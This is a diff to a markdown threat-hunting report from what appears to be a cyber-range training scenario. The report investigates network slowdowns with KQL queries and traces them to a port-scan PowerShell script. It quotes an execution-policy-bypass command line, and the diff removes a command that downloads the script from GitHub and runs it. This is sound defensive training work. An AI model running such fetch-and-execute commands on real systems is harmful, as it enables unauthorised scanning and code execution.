@@ -68,7 +68,7 @@ DeviceNetworkEvents
 | order by FailedConnectionsAttempts desc
 ```
 
-📸 Screenshot: `Screenshot 2025-06-15 232635.png` (Network analysis showing failed connections)
+![Screenshot 2025-06-15 232635](https://github.com/user-attachments/assets/861c245d-d388-45ed-8c7e-7c8b45f18334)
 
 ### 4. Investigation
 Used `DeviceProcessEvents` to locate scripts run during the attack:
@@ -79,15 +79,15 @@ DeviceProcessEvents
 | order by Timestamp desc
 | project Timestamp, FileName, InitiatingProcessCommandLine, ActionType
 ```
+![Screenshot 2025-06-15 234201](https://github.com/user-attachments/assets/7f84ec6c-769f-4a18-8dfd-0eee0c798a34)
 
 Identified the script:
 ```
 cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
 ```
+**Logged in to the suspicious account and went to the ProgramData folder and found the portscan.ps1 and clicked to edit to see the whole script**
 
-📸 Screenshots:
-- `Screenshot 2025-06-15 234201.png` (Process creation detection)
-- `Logged in to suspicious VM to check the file and the malicious script.PNG`
+![Logged in to suspicious VM to check the file and the malicious script](https://github.com/user-attachments/assets/1f5a1ec5-39a8-45c8-975f-6580d39c2f56)
 
 ### 5. Response
 Steps taken:
@@ -96,16 +96,11 @@ Steps taken:
 - ✅ Rebuilt the VM from Azure Portal.
 - ✅ Enabled PowerShell Script Block & Module Logging.
 
-📸 Screenshot: `Screenshot 2025-06-15 234540.png` (Device isolation in MDE)
+![Screenshot 2025-06-15 234540](https://github.com/user-attachments/assets/0d04f893-ac1f-4b41-8097-2d8bb751c6e2)
 
 ### 6. Documentation
-Script downloaded via:
-```powershell
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';
-cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
-```
-
-📎 All screenshots are archived per investigation phase.
+**Documented all processes for the threat hunting scenario in this pdf file:
+file:///C:/Users/arbof/Downloads/FelipeCopy%20of%20Scenario%202_%20Sudden%20Network%20Slowdowns.pdf
 
 ### 7. Improvement
 - 🔐 Hardened PowerShell logging.
